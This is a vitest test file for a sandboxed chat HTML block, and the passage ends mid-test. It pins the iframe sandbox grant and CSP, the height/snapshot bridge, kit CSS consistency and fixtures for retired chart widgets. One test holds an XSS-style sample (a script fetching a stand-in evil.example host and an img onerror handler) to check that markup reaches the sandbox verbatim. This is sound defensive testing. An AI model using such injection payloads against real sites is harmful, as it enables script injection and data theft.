/**
 * The `dream-html` block: the fence, the sandbox, the srcdoc, the height bridge, the brand
 * override — and the RETIREMENT FIXTURES.
 *
 * Those last ones are the point of the file. On 2026-08-26 the typed `chart` (five renders)
 * and `page` (seven widgets) payloads retired in favour of agent-authored HTML, on the
 * argument that anything the vocabulary could draw, the kit can draw too. That argument is
 * only worth anything if it is checked: a retirement that quietly loses a capability is a
 * regression wearing a refactor's clothes. So every retired shape has a fixture here, and
 * each one is proven to (a) use only classes the kit actually defines, (b) survive the real
 * fence parser, and (c) reach the srcdoc intact.
 *
 * Root vitest, so `.js` specifiers and no DOM: everything under test is a pure function.
 * `resolveChatKitTokens` reads `getComputedStyle` and is therefore exercised by the runtime
 * verify script (`scripts/verify/`), not here.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { parseChatActions, MAX_HTML_BYTES, MAX_HTMLS_PER_MESSAGE } from '../../dashboard/src/components/sleepy/chat/chatActions.js';
import {
  buildChatSrcdoc, readHeightMessage, htmlOutline, HEIGHT_BRIDGE, HEIGHT_MESSAGE_KEY, HEIGHT_REQUEST_KEY,
  CHAT_HTML_CSP, CHAT_HTML_SANDBOX, CHAT_HTML_KIT_CSS, CHAT_KIT_TOKENS, CHAT_READING_TOKENS,
  SNAPSHOT_MESSAGE_KEY, SNAPSHOT_REQUEST_KEY,
} from '../../dashboard/src/components/sleepy/chat/chatHtmlKit.js';
import { SANDBOX_FONT_CSS } from '../../dashboard/src/lib/sandboxFont.js';
import {
  MIN_HTML_HEIGHT, MAX_HTML_HEIGHT, HTML_PENDING_HEIGHT,
} from '../../dashboard/src/components/sleepy/chat/chatHtmlKit.js';
import { handleChatHtmlKitGet } from '../../src/server/routes/chat-html-kit.js';
import type { IncomingMessage, ServerResponse } from 'node:http';

const CHAT_DIR = join(new URL('../../', import.meta.url).pathname, 'dashboard/src/components/sleepy/chat');

const fence = (html: string) => '```dream-html\n' + html + '\n```';

// ─────────────────────────────────────────────────────────────────────────────────────────
// The fence
// ─────────────────────────────────────────────────────────────────────────────────────────

describe('parseChatActions — the dream-html fence', () => {
  it('lifts the block out of the prose entirely, leaving no markup behind', () => {
    const r = parseChatActions(`Here is the shape.\n\n${fence('<div class="dc-doc">hi</div>')}\n\nWhat do you think?`);
    expect(r.body).toBe('Here is the shape.\n\nWhat do you think?');
    expect(r.body).not.toContain('<div');
    expect(r.body).not.toContain('dream-html');
    expect(r.blocks).toEqual([{ kind: 'html', html: '<div class="dc-doc">hi</div>' }]);
  });

  it('keeps blocks in WRITTEN order when html and view fences interleave', () => {
    const text = [
      fence('<p class="dc-p">first</p>'),
      '```dream-view\n{"type":"insight","id":"wau"}\n```',
      fence('<p class="dc-p">second</p>'),
    ].join('\n\n');
    expect(parseChatActions(text).blocks.map((b) => (b.kind === 'html' ? b.html : b.view.type)))
      .toEqual(['<p class="dc-p">first</p>', 'insight', '<p class="dc-p">second</p>']);
  });

  it('hides a still-streaming block rather than flashing half-written markup', () => {
    const r = parseChatActions('Building it now.\n\n```dream-html\n<div class="dc-doc"><h2 class="dc-h2">Half a');
    expect(r.body).toBe('Building it now.');
    expect(r.body).not.toContain('<div');
    expect(r.pendingView).toBe(true);
    expect(r.blocks).toEqual([]);
  });

  it('tolerates ~~~ fences and indentation, like the other two blocks do', () => {
    expect(parseChatActions('~~~dream-html\n<b>x</b>\n~~~').blocks).toEqual([{ kind: 'html', html: '<b>x</b>' }]);
  });

  it('drops an empty block silently — there is nothing to render and nothing to report', () => {
    const r = parseChatActions(fence('   \n  '));
    expect(r.blocks).toEqual([]);
    expect(r.notices).toEqual([]);
  });

  it(`caps a single block at ${MAX_HTML_BYTES / 1024}KB, LOUDLY — no truncation`, () => {
    const r = parseChatActions(fence('<p>' + 'a'.repeat(MAX_HTML_BYTES) + '</p>'));
    expect(r.blocks).toEqual([]);
    expect(r.notices.some((n) => /limit/i.test(n))).toBe(true);
  });

  it(`caps a message at ${MAX_HTMLS_PER_MESSAGE} blocks, keeping the first ones and saying so`, () => {
    const text = Array.from({ length: MAX_HTMLS_PER_MESSAGE + 2 }, (_x, i) => fence(`<p>${i}</p>`)).join('\n\n');
    const r = parseChatActions(text);
    expect(r.blocks.length).toBe(MAX_HTMLS_PER_MESSAGE);
    expect(r.blocks[0]).toEqual({ kind: 'html', html: '<p>0</p>' });
    expect(r.notices.some((n) => n.includes(String(MAX_HTMLS_PER_MESSAGE)))).toBe(true);
  });

  it('an over-cap block does not take the prose down with it', () => {
    const r = parseChatActions(`Real answer.\n\n${fence('<p>' + 'a'.repeat(MAX_HTML_BYTES) + '</p>')}`);
    expect(r.body).toBe('Real answer.');
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────
// The sandbox — the whole security argument, pinned
// ─────────────────────────────────────────────────────────────────────────────────────────

describe('the sandbox is the boundary', () => {
  it('grants scripts and NOTHING else — allow-same-origin would void the CSP', () => {
    expect(CHAT_HTML_SANDBOX).toBe('allow-scripts');
    expect(CHAT_HTML_SANDBOX).not.toContain('allow-same-origin');
    expect(CHAT_HTML_SANDBOX).not.toContain('allow-top-navigation');
    expect(CHAT_HTML_SANDBOX).not.toContain('allow-popups');
    expect(CHAT_HTML_SANDBOX).not.toContain('allow-forms');
  });

  it("forbids every fetch: default-src 'none', and no source list that reaches the network", () => {
    expect(CHAT_HTML_CSP).toContain("default-src 'none'");
    expect(CHAT_HTML_CSP).toContain("style-src 'unsafe-inline'");
    expect(CHAT_HTML_CSP).toContain("script-src 'unsafe-inline'");
    expect(CHAT_HTML_CSP).not.toMatch(/connect-src|img-src|https?:/);
    // `font-src data:` is the ONE addition (F5 — the reading face could not otherwise
    // cross the frame boundary) and it is not a network source: a data: URL contacts no
    // host. This asserts the exact shape, so `font-src https:` or a host allow-list — both
    // of which WOULD reach the network — cannot slip in behind the same directive name.
    expect(CHAT_HTML_CSP).toContain('font-src data:');
    expect(CHAT_HTML_CSP).not.toMatch(/font-src[^;]*(https?:|\*|'self')/);
  });

  it('carries the reading face INSIDE the document, since it can never fetch one', () => {
    const doc = buildChatSrcdoc({ html: '<b>x</b>', tokens: {} });
    expect(doc).toContain("@font-face{font-family:'Inter'");
    expect(doc).toContain('src:url(data:font/woff2;base64,');
    // Three families x two subsets. Turkish lives in latin-ext, so shipping only latin
    // would render ğ ş İ in another face; and the kit names three faces, so embedding only
    // the text one leaves every heading and code chip falling back.
    expect(doc.match(/@font-face/g)).toHaveLength(6);
    for (const family of ['Inter', 'Plus Jakarta Sans', 'JetBrains Mono']) {
      expect(SANDBOX_FONT_CSS, family).toContain(`font-family:'${family}'`);
    }
    expect(SANDBOX_FONT_CSS).toContain('U+0100-02BA');
  });

  it('the generated font constant matches the vendored woff2 — mirrors rot silently', () => {
    // Same drift lock as the kit CSS mirror (knowledge/patterns/mirror-with-drift-test.md):
    // the bytes live in a generated TS constant because these modules must stay importable
    // by root vitest, which has no Vite asset pipeline.
    const fonts = join(new URL('../../', import.meta.url).pathname, 'dashboard/src/assets/fonts');
    const files = ['inter', 'jakarta', 'jetbrains']
      .flatMap((stem) => [`${stem}-latin.woff2`, `${stem}-latin-ext.woff2`]);
    for (const f of files) {
      const b64 = readFileSync(join(fonts, f)).toString('base64');
      expect(SANDBOX_FONT_CSS, `${f} — re-run scripts/gen-sandbox-font-mirror.mjs`).toContain(b64);
    }
  });

  it('puts the CSP meta FIRST — a parser that already saw a resource has already lost', () => {
    const doc = buildChatSrcdoc({ html: '<b>x</b>', tokens: {} });
    expect(doc.indexOf('Content-Security-Policy')).toBeLessThan(doc.indexOf('<style>'));
    expect(doc.indexOf('Content-Security-Policy')).toBeLessThan(doc.indexOf('<b>x</b>'));
  });

  it('is the SAME grant and CSP the Lab card uses — one hardening fix must reach both', async () => {
    const lab = await import('../../dashboard/src/components/lab/labHtmlKit.js');
    expect(lab.HTML_KIT_SANDBOX).toBe(CHAT_HTML_SANDBOX);
    expect(lab.HTML_KIT_CSP).toBe(CHAT_HTML_CSP);
  });

  it('never sanitizes the markup — the boundary is the sandbox, so the body arrives verbatim', () => {
    const nasty = '<script>fetch("https://evil.example")</script><img src=x onerror=alert(1)>';
    expect(buildChatSrcdoc({ html: nasty, tokens: {} })).toContain(nasty);
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────
// The srcdoc
// ─────────────────────────────────────────────────────────────────────────────────────────

describe('buildChatSrcdoc', () => {
  it('inlines the RESOLVED token values — CSS variables do not cross the iframe boundary', () => {
    const doc = buildChatSrcdoc({ html: '<b>x</b>', tokens: { '--chart-1': '#123456', '--color-text': 'black' } });
    expect(doc).toContain('--chart-1: #123456;');
    expect(doc).toContain('--color-text: black;');
  });

  it('declares the embedding theme as the document color-scheme, defaulting to light', () => {
    expect(buildChatSrcdoc({ html: '<b>x</b>', tokens: {}, scheme: 'dark' })).toContain('color-scheme: dark;');
    expect(buildChatSrcdoc({ html: '<b>x</b>', tokens: {} })).toContain('color-scheme: light;');
  });

  it('embeds the kit', () => {
    expect(buildChatSrcdoc({ html: '<b>x</b>', tokens: {} })).toContain('.dc-doc');
  });

  it('puts the brand override AFTER the kit — "later wins" IS the override mechanism', () => {
    const doc = buildChatSrcdoc({ html: '<b>x</b>', tokens: {}, overrideCss: '.dc-h1 { color: hotpink; }' });
    expect(doc.indexOf('.dc-h1 { color: hotpink; }')).toBeGreaterThan(doc.indexOf('.dc-doc'));
  });

  it('omits the override style block entirely when the vault has none', () => {
    // Three without an override — the embedded face, the resolved tokens, the kit — and a
    // fourth only when the vault actually has a brand sheet. Counted rather than merely
    // checked for absence, because an empty `<style></style>` would satisfy "no override
    // css" while still being a block in the cascade.
    const bare = buildChatSrcdoc({ html: '<b>x</b>', tokens: {} });
    expect(bare.match(/<style>/g)?.length).toBe(3);
    const branded = buildChatSrcdoc({ html: '<b>x</b>', tokens: {}, overrideCss: '.dc-p{}' });
    expect(branded.match(/<style>/g)?.length).toBe(4);
  });

  it('carries the mode on <html> so the kit\'s slide rules can see it', () => {
    expect(buildChatSrcdoc({ html: '<b>x</b>', tokens: {} })).toContain('data-dc-mode="card"');
    expect(buildChatSrcdoc({ html: '<b>x</b>', tokens: {}, mode: 'full' })).toContain('data-dc-mode="full"');
  });

  it('runs the bridge in BOTH modes — the export bar needs it where the buttons are', () => {
    // It used to be card-only, on the reasoning that fullscreen owns its own height and a
    // measurement there would fight it. Still true, and still how it behaves — the full
    // mode's host listener returns early. But the bridge grew a SECOND leg (the snapshot
    // the export bar reads), and that bar lives in the fullscreen header, so a frame with
    // no bridge there is a fullscreen with four dead buttons.
    for (const mode of ['card', 'full'] as const) {
      const doc = buildChatSrcdoc({ html: '<b>x</b>', tokens: {}, mode });
      expect(doc, mode).toContain(HEIGHT_MESSAGE_KEY);
      expect(doc, mode).toContain(SNAPSHOT_MESSAGE_KEY);
    }
  });

  it('…and the fullscreen host still ignores the height it hears', () => {
    // The half the old assertion was really protecting. Enforced in HtmlView, not the kit.
    const source = readFileSync(join(CHAT_DIR, 'HtmlView.tsx'), 'utf-8');
    expect(source).toMatch(/if \(mode !== 'card'\) return;/);
  });

  it('mounts the height bridge in the HEAD, above the body it measures', () => {
    const doc = buildChatSrcdoc({ html: '<b>x</b>', tokens: {} });
    expect(doc.indexOf(HEIGHT_MESSAGE_KEY)).toBeLessThan(doc.indexOf('</head>'));
    expect(doc.indexOf(HEIGHT_MESSAGE_KEY)).toBeLessThan(doc.indexOf('<b>x</b>'));
  });

  it('…so a body that never closes a <script> can no longer swallow it', () => {
    // The reflex from inlining JS into an HTML page: escaping the closing tag leaves the
    // element OPEN, and the parser turns everything after it into script text. Appended
    // below the body, the bridge went with it and the block froze at its 40px floor —
    // silently, because the markup above the break still drew. Above the body it has
    // already run before the parser ever meets this.
    const swallower = '<script>var s = "<\\/script>";</script>';
    const doc = buildChatSrcdoc({ html: swallower, tokens: {} });
    expect(doc.indexOf(HEIGHT_MESSAGE_KEY)).toBeLessThan(doc.indexOf(swallower));
  });

  it('resolves the display face and elevated radii the Lab card never needed', () => {
    for (const token of ['--font-family-display', '--radius-xl', '--shadow-lg']) {
      expect(CHAT_KIT_TOKENS, token).toContain(token);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────
// The height bridge
// ─────────────────────────────────────────────────────────────────────────────────────────

describe('the height bridge', () => {
  it('measures the BODY, not documentElement — the html element chases the frame we set', () => {
    expect(HEIGHT_BRIDGE).toContain('document.body.getBoundingClientRect()');
    expect(HEIGHT_BRIDGE).not.toContain('documentElement.getBoundingClientRect()');
  });

  it('posts exactly two things, both namespaced, and both about ITSELF', () => {
    // The bridge's honest bound (knowledge/patterns/sandboxed-app-bridge-pattern.md): it
    // may carry the block's own content, never the app's. Two legs now — the height, and
    // the body snapshot the export bar reads — and this counts them so a third cannot be
    // added without someone re-reading that sentence.
    expect(HEIGHT_MESSAGE_KEY).toBe('__dreamHtmlHeight');
    expect(SNAPSHOT_MESSAGE_KEY).toBe('__dreamHtmlSnapshot');
    expect(HEIGHT_BRIDGE.match(/postMessage/g)?.length).toBe(2);
    // Both payloads are keyed by a namespaced constant, so an unrelated postMessage on the
    // page can never be read as either one. Asserted on the BUILT bridge, where the
    // interpolation has already happened — that is the string the frame actually runs.
    const posted = [...HEIGHT_BRIDGE.matchAll(/postMessage\(\{\s*(__\w+)/g)].map((m) => m[1]);
    expect(posted.sort()).toEqual([HEIGHT_MESSAGE_KEY, SNAPSHOT_MESSAGE_KEY].sort());
  });

  it('the snapshot reads the frame\'s OWN body and nothing else', () => {
    // What would break the bound: reaching for `parent`, a cookie, or storage. A sandboxed
    // frame cannot get at any of them anyway — this is the guard on someone later relaxing
    // the sandbox and finding the bridge already primed to carry it out.
    const leg = HEIGHT_BRIDGE.slice(HEIGHT_BRIDGE.indexOf(SNAPSHOT_REQUEST_KEY));
    expect(leg).toContain('document.body');
    expect(leg).not.toMatch(/parent\.(?!postMessage)/);
    expect(leg).not.toMatch(/document\.cookie|localStorage|sessionStorage|indexedDB/);
  });

  it('waits for the body — parsed in the head, it has none yet', () => {
    expect(HEIGHT_BRIDGE).toContain('DOMContentLoaded');
    expect(HEIGHT_BRIDGE).toContain('if (!document.body) return;');
  });

  it('re-reports when the HOST asks, FORCED past the dedupe', () => {
    // Without the force this answers a retry with silence: the body has not resized since
    // the report that went missing, so the deduping `last` swallows the answer and the
    // block stays at its floor — which is the entire bug the request exists to end.
    expect(HEIGHT_REQUEST_KEY).toBe('__dreamHtmlMeasure');
    expect(HEIGHT_BRIDGE).toContain(`event.data.${HEIGHT_REQUEST_KEY} === true`);
    expect(HEIGHT_BRIDGE).toContain('report(true)');
  });

  it('answers its own parent and nobody else', () => {
    expect(HEIGHT_BRIDGE).toContain('event.source !== parent');
  });

  it('reads a well-formed height', () => {
    expect(readHeightMessage({ [HEIGHT_MESSAGE_KEY]: 412 })).toBe(412);
  });

  it('clamps rather than trusting — a runaway layout cannot grow the frame forever', () => {
    expect(readHeightMessage({ [HEIGHT_MESSAGE_KEY]: 0 })).toBe(MIN_HTML_HEIGHT);
    expect(readHeightMessage({ [HEIGHT_MESSAGE_KEY]: -900 })).toBe(MIN_HTML_HEIGHT);
    expect(readHeightMessage({ [HEIGHT_MESSAGE_KEY]: 10 ** 9 })).toBe(MAX_HTML_HEIGHT);
    expect(readHeightMessage({ [HEIGHT_MESSAGE_KEY]: 100.4 })).toBe(101);
  });

  it.each([
    ['a foreign message', { type: 'webpackOk' }],
    ['a string payload', 'hello'],
    ['null', null],
    ['a non-numeric height', { [HEIGHT_MESSAGE_KEY]: '400' }],
    ['NaN', { [HEIGHT_MESSAGE_KEY]: Number.NaN }],
    ['Infinity', { [HEIGHT_MESSAGE_KEY]: Number.POSITIVE_INFINITY }],
  ])('ignores %s', (_label, data) => {
    expect(readHeightMessage(data)).toBeNull();
  });

  it('the host authenticates by SOURCE, never by origin — a sandboxed frame\'s origin is "null"', () => {
    const source = readFileSync(join(CHAT_DIR, 'HtmlView.tsx'), 'utf-8');
    expect(source).toContain('event.source !== frameRef.current.contentWindow');
    expect(source).not.toContain('event.origin');
  });

  it('HtmlView mounts the frame with the pinned grant, not a hand-written string', () => {
    const source = readFileSync(join(CHAT_DIR, 'HtmlView.tsx'), 'utf-8');
    expect(source).toContain('sandbox={CHAT_HTML_SANDBOX}');
    expect(source).not.toMatch(/sandbox="[^"]*allow-same-origin/);
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────
// The kit mirror
// ─────────────────────────────────────────────────────────────────────────────────────────

describe('the kit', () => {
  it('the TS string and the .css reference copy are byte-identical', () => {
    // The TS constant is what actually ships (vitest stubs `.css?raw` imports to empty —
    // the Lab lost a day to this); the .css file is the copy a human reads and a brand
    // override is written against. They drift the moment someone edits only one.
    const file = readFileSync(join(CHAT_DIR, 'chat-html-kit.css'), 'utf-8');
    expect(CHAT_HTML_KIT_CSS).toBe(file);
  });

  it('hardcodes no color — every value comes from a token, so themes and brands both work', () => {
    // `#fff` on the funnel bar is the one exception and it is deliberate: that text sits on
    // a chart-color fill in BOTH themes, so it cannot follow --color-text.
    const colors = CHAT_HTML_KIT_CSS.match(/#[0-9a-fA-F]{3,8}\b/g) ?? [];
    expect(colors).toEqual(['#fff']);
  });

  it('reads no token the host does not resolve — an unresolved var paints NOTHING', () => {
    // CSS variables do not cross the iframe boundary: whatever `CHAT_KIT_TOKENS` omits
    // arrives as an empty value inside the frame, and the property it fed silently drops.
    // That is how `.dc-mark`'s stroke would vanish if its highlight pair went unlisted, so
    // the coverage is checked exhaustively rather than spot-checked. `--dc-*` are the kit's
    // OWN locals, declared in the same sheet that reads them.
    const used = new Set(
      [...CHAT_HTML_KIT_CSS.matchAll(/var\((--[a-z0-9-]+)/g)].map((m) => m[1]),
    );
    // Two lists, because they resolve off two different elements: CHAT_KIT_TOKENS off
    // :root, CHAT_READING_TOKENS off the chat pane (that is where --chat-text is declared).
    // A kit var in neither is a property that silently drops inside the frame.
    const injected = [...CHAT_KIT_TOKENS, ...CHAT_READING_TOKENS];
    for (const token of used) {
      if (token.startsWith('--dc-')) {
        expect(CHAT_HTML_KIT_CSS, token).toMatch(new RegExp(`${token}:`));
        continue;
      }
      expect(injected, token).toContain(token);
    }
  });

  it('sets its type against the TRANSCRIPT\'s reading size, not one of its own', () => {
    // The defect (owner report 2026-09-02): the kit hardcoded 14px/1.55 while every other
    // prose surface in the chat reads --chat-text (15px x --zoom) at --chat-line-height
    // 1.75, so the block was smaller AND tighter than the paragraph above it, and deaf to
    // the window's zoom control. The px in the fallbacks is what a host with no chat pane
    // still gets; the point is that it is a FALLBACK.
    expect(CHAT_HTML_KIT_CSS).toMatch(/html \{\s*font-size: var\(--chat-text, 14px\);/);
    expect(CHAT_HTML_KIT_CSS).toMatch(/line-height: var\(--chat-line-height, 1\.55\)/);
    expect(CHAT_HTML_KIT_CSS).toMatch(/body \{[^}]*font-size: 1rem;/);
  });

  it('sizes every class off that one root — no second scale to keep in step', () => {
    // Why rem and not em: a chip inside a stat inside a card would compound, and the sizes
    // an author reads in the class list would not be the sizes they get. The two survivors
    // in px are SVG text, which is viewBox user units and does not belong to this scale.
    const px = [...CHAT_HTML_KIT_CSS.matchAll(/([.\w-]+[^{}]*)\{[^}]*font-size: [\d.]+px/g)]
      .map((m) => m[1].trim().split('\n').pop().trim());
    expect(px.sort()).toEqual(['.dc-axis-text', '.dc-tip-text']);
  });

  it('the fullscreen size is DERIVED from the same root, not a second constant', () => {
    // A literal 15px in full mode is how the presentation stops following the zoom control
    // while the inline block follows it.
    expect(CHAT_HTML_KIT_CSS)
      .toMatch(/html\[data-dc-mode="full"\] \{ font-size: calc\(var\(--chat-text, 14px\) \* 1\.07\); \}/);
  });

  it('never paints `--color-accent-text` on a TINT — it is white, and wants a solid fill', () => {
    // The bug this pins: `.dc-mark` was `--color-accent-text` (white) on `--color-accent-soft`
    // (a ~16% accent tint), so the one phrase an author marked as load-bearing was the one
    // phrase in the block that could not be read (owner report 08-27). The token stays in
    // CHAT_KIT_TOKENS for a brand override that does paint a solid accent fill; the kit
    // itself must not, because every accent surface it owns is a TINT.
    // (The kit's own comment NAMES the token, to keep the reason next to the fix — so the
    // assertion is on the reference, not the mention.)
    expect(CHAT_HTML_KIT_CSS).not.toContain('var(--color-accent-text)');
    // And the marker keeps the text colour it inherited, exactly like the app's own <mark>.
    expect(CHAT_HTML_KIT_CSS).toMatch(/\.dc-mark, mark \{[^}]*color: inherit/);
    // The one place the kit DOES own a solid fill is the funnel bar (--chart-1 edge to
    // edge), and that is exactly where the token belongs. It used to be a hardcoded #fff,
    // which a brand override pulling chart-1 light would have made invisible.
    expect(CHAT_HTML_KIT_CSS)
      .toMatch(/\.dc-funnel-bar \{[^}]*color: var\(--color-accent-text, #fff\)/);
  });

  it('keeps html and body at auto height, or the bridge would chase the frame it sets', () => {
    expect(CHAT_HTML_KIT_CSS).toMatch(/html,\s*body\s*\{[^}]*height:\s*auto/);
  });

  it('only .dc-slide reads the host mode — everything else renders the same in both', () => {
    const modeRules = CHAT_HTML_KIT_CSS.match(/html\[data-dc-mode="full"\][^{]*/g) ?? [];
    expect(modeRules.length).toBeGreaterThan(0);
    for (const rule of modeRules) {
      // The bare root selector is the exception and it is the ROOT SIZE — fullscreen reads
      // a notch larger, as it always did, but now derived from --chat-text rather than
      // frozen at 15px. Everything below it scales in rem, so nothing else needs a rule.
      expect(rule, rule).toMatch(/\.dc-slides?|body|^html\[data-dc-mode="full"\] $/);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────
// THE RETIREMENT FIXTURES — everything `chart` and `page` could draw, in the kit
// ─────────────────────────────────────────────────────────────────────────────────────────

/** Every class the kit defines, parsed off its selectors. */
const KIT_CLASSES = new Set(
  (CHAT_HTML_KIT_CSS.match(/\.dc-[a-z0-9-]+/g) ?? []).map((s) => s.slice(1)),
);

/** Every `dc-` class a fixture uses. */
function classesIn(html: string): string[] {
  return [...new Set((html.match(/class="([^"]*)"/g) ?? [])
    .flatMap((attr) => attr.slice(7, -1).split(/\s+/))
    .filter((c) => c.startsWith('dc-')))];
}

/** The five retired `chart` renders. */
const CHART_FIXTURES: [string, string][] = [
  ['number', `<div class="dc-stat"><span class="dc-stat-label">Weekly active</span>
    <span class="dc-value dc-value--lg">12,481<span class="dc-unit">users</span></span>
    <span class="dc-delta dc-delta--up">+8.2% vs last week</span></div>`],
  ['line', `<svg class="dc-svg" viewBox="0 0 300 90" role="img" aria-label="Signups over 4 weeks">
    <line class="dc-gridline" x1="0" y1="60" x2="300" y2="60"/>
    <polyline class="dc-s1" fill="none" stroke-width="2" points="0,70 100,52 200,30 300,12"/>
    <text class="dc-axis-text" x="0" y="88">Jul 1</text></svg>
    <div class="dc-legend"><span><i class="dc-legend-swatch dc-bg1"></i>signups</span></div>`],
  ['pie', `<svg class="dc-svg" viewBox="0 0 32 32" role="img" aria-label="Plan mix">
    <circle class="dc-f1" r="16" cx="16" cy="16"/>
    <path class="dc-f2" d="M16 16 L16 0 A16 16 0 0 1 32 16 Z"/></svg>
    <div class="dc-legend"><span><i class="dc-legend-swatch dc-bg2"></i>Pro 41%</span></div>`],
  ['table', `<table class="dc-table"><thead><tr><th>Week</th><th class="dc-num">Signups</th></tr></thead>
    <tbody><tr><td>Jul 1</td><td class="dc-num">1,204</td></tr></tbody></table>
    <p class="dc-caption">Snapshot · 2026-08-26</p>`],
  ['funnel', `<div class="dc-funnel">
    <div class="dc-funnel-step"><span class="dc-funnel-bar dc-bg1" style="width:100%">Visited · 42,010</span></div>
    <div class="dc-funnel-step"><span class="dc-funnel-bar dc-bg2" style="width:38%">Signed up · 15,964</span>
      <span class="dc-funnel-drop">−62%</span></div></div>`],
];

/** The seven retired `page` widgets. */
const PAGE_FIXTURES: [string, string][] = [
  ['card', `<div class="dc-card"><img class="dc-card-img" alt="" src="shots/gti.png">
    <span class="dc-card-title">Golf GTI</span><span class="dc-card-sub">2019 · 78,000 km</span>
    <div class="dc-card-foot"><span class="dc-chip dc-chip--good">Serviced</span></div></div>`],
  ['rail', `<div class="dc-rail"><div class="dc-card"><span class="dc-card-title">A</span></div>
    <div class="dc-card"><span class="dc-card-title">B</span></div></div>`],
  ['table', `<table class="dc-table"><thead><tr><th></th><th>A</th><th>B</th></tr></thead>
    <tbody><tr><td>Price</td><td>€18k</td><td>€21k</td></tr></tbody></table>`],
  ['text', `<p class="dc-p">Three of the four fit the budget.</p>`],
  ['stat', `<div class="dc-grid dc-grid--3">
    <div class="dc-stat"><span class="dc-value">42</span><span class="dc-stat-label">Answers</span>
      <span class="dc-stat-note">so far</span></div></div>`],
  ['image', `<figure><img class="dc-img" src="docs/shot.png" alt="The board"><figcaption class="dc-figcaption">The board</figcaption></figure>`],
  ['divider', `<div class="dc-divider-label">Section</div><hr class="dc-divider">`],
];

/** The shapes the retired vocabulary could NOT express at all — the reason for the change. */
const NEW_FIXTURES: [string, string][] = [
  ['a decision, rendered', `<div class="dc-compare">
    <div class="dc-option dc-option--pick"><div class="dc-option-head">
      <span class="dc-option-title">Behind a flag</span><span class="dc-chip dc-chip--accent">recommended</span></div>
      <ul class="dc-pros"><li>Reversible</li></ul><ul class="dc-cons"><li>Two paths</li></ul></div>
    <div class="dc-option"><div class="dc-option-head"><span class="dc-option-title">Cut over</span></div></div></div>`],
  ['a process', `<ol class="dc-steps"><li class="dc-step"><div class="dc-step-body">
    <span class="dc-h3">Sync</span><span class="dc-muted">Pulls the cache</span></div></li></ol>`],
  ['a pipeline', `<div class="dc-flow"><div class="dc-flow-node">script</div>
    <div class="dc-flow-arrow">→</div><div class="dc-flow-node">cache</div></div>`],
  ['a timeline', `<div class="dc-timeline"><div class="dc-tl"><span class="dc-tl-dot"></span>
    <div class="dc-tl-body"><span class="dc-tl-when">2026-08-25</span><span>html/v1 shipped</span></div></div></div>`],
  ['tabs', `<div class="dc-tabs"><input type="radio" name="g" id="g1" checked><input type="radio" name="g" id="g2">
    <div class="dc-tablist"><label class="dc-tab" for="g1">Before</label><label class="dc-tab" for="g2">After</label></div>
    <div class="dc-panels"><section class="dc-panel">…</section><section class="dc-panel">…</section></div></div>`],
  ['a slide deck', `<div class="dc-slides"><section class="dc-slide"><h1 class="dc-h1">Q3</h1>
    <p class="dc-lede">What shipped</p></section></div>`],
  ['a callout', `<div class="dc-callout dc-callout--warn">Sample below 30 — read this as a hint.</div>`],
  ['a key/value spec list', `<dl class="dc-kv"><dt>Engine</dt><dd>2.0 TSI</dd></dl>`],
  ['a bar list', `<div class="dc-bar"><span class="dc-bar-label">Türkiye</span>
    <span class="dc-bar-track"><span class="dc-bar-fill" style="width:72%"></span></span>
    <span class="dc-bar-value">1,204</span></div>`],
  ['an interactive toggle', `<button class="dc-btn" aria-pressed="true">Weekly</button>
    <script>document.querySelector('.dc-btn').onclick = (e) => e.target.setAttribute('aria-pressed', 'false');</script>`],
];

describe('the retired chart/page vocabulary, expressed in the kit', () => {
  const ALL = [
    ...CHART_FIXTURES.map(([n, h]) => [`chart:${n}`, h] as [string, string]),
    ...PAGE_FIXTURES.map(([n, h]) => [`page:${n}`, h] as [string, string]),
    ...NEW_FIXTURES,
  ];

  it.each(ALL)('%s — uses only classes the kit defines', (_label, html) => {
    const used = classesIn(html);
    expect(used.length, 'a fixture that uses no kit class proves nothing').toBeGreaterThan(0);
    const undefinedClasses = used.filter((c) => !KIT_CLASSES.has(c));
    expect(undefinedClasses, `undefined in chat-html-kit.css: ${undefinedClasses.join(', ')}`).toEqual([]);
  });

  it.each(ALL)('%s — survives the real fence parser and reaches the srcdoc', (_label, html) => {
    const parsed = parseChatActions(fence(html));
    expect(parsed.blocks.length).toBe(1);
    expect(parsed.body).toBe('');
    const body = parsed.blocks[0];
    expect(body.kind).toBe('html');
    if (body.kind !== 'html') return;
    expect(buildChatSrcdoc({ html: body.html, tokens: {} })).toContain(body.html);
  });

  it('covers every render the retired chart type had', () => {
    expect(CHART_FIXTURES.map(([n]) => n).sort()).toEqual(['funnel', 'line', 'number', 'pie', 'table']);
  });

  it('covers every widget the retired page type had', () => {
    expect(PAGE_FIXTURES.map(([n]) => n).sort())
      .toEqual(['card', 'divider', 'image', 'rail', 'stat', 'table', 'text']);
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────
// The brand override route
// ─────────────────────────────────────────────────────────────────────────────────────────

describe('GET /api/chat/html-kit — the brand override', () => {
  let root: string;
  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'dc-chatkit-'));
  });
  afterEach(() => rmSync(root, { recursive: true, force: true }));

  /** Minimal ServerResponse double — the handler only ever calls `sendJson`. */
  function capture() {
    const out: { status?: number; body?: Record<string, unknown> } = {};
    const res = {
      statusCode: 200,
      setHeader() {},
      writeHead(status: number) { out.status = status; return this; },
      end(payload?: string) { if (payload) out.body = JSON.parse(payload); },
    } as unknown as ServerResponse;
    return { res, out };
  }

  const call = async (r: string) => {
    const { res, out } = capture();
    await handleChatHtmlKitGet({} as IncomingMessage, res, {}, r);
    return out;
  };

  it('answers 200 with css:null when the vault has no override — that is not an error', async () => {
    const out = await call(root);
    expect(out.status).toBe(200);
    expect(out.body).toMatchObject({ css: null, notice: null });
  });

  it('returns the override verbatim when it exists', async () => {
    mkdirSync(join(root, 'overrides'), { recursive: true });
    writeFileSync(join(root, 'overrides/chat-html-kit.css'), ':root { --color-accent: hotpink; }');
    const out = await call(root);
    expect(out.body?.css).toBe(':root { --color-accent: hotpink; }');
  });

  it('refuses an oversized override and SAYS SO — a silently ignored brand sheet is worse', async () => {
    mkdirSync(join(root, 'overrides'), { recursive: true });
